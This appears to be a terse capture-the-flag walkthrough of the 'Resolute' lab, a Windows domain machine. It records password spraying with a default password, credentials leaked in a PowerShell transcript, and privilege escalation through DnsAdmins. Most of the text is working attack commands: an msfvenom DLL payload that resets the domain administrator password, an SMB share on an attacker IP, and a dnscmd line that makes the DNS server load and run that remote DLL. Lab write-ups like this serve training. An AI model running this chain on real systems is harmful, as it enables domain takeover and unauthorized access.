we enumerate users
![[Pasted image 20250217133116.png]]
and found default password Welcome123!
so we can enumerate this pass for our users
![[Pasted image 20250217133147.png]]
melanie:Welcome123!

we start enumerate our file system
![[Pasted image 20250217135423.png]]
PS C:\PSTranscripts\20191203> cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
![[Pasted image 20250217135501.png]]
ryan Serv3r4Admin4cc123!
![[Pasted image 20250217135623.png]]
ryan is a local admin we check it with crackmapexec and group member of DnsAdmins 
![[Pasted image 20250217141213.png]]

create payload 
msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll -o adduser.dll
sudo impacket-smbserver share ./ -smb2support
in windows host:
сmd /c dnscmd.exe /config /serverlevelplugindll \\10.10.14.14\share\adduser.dll

sc.exe stop dns
sc.exe start dns

![[Pasted image 20250217143835.png]]


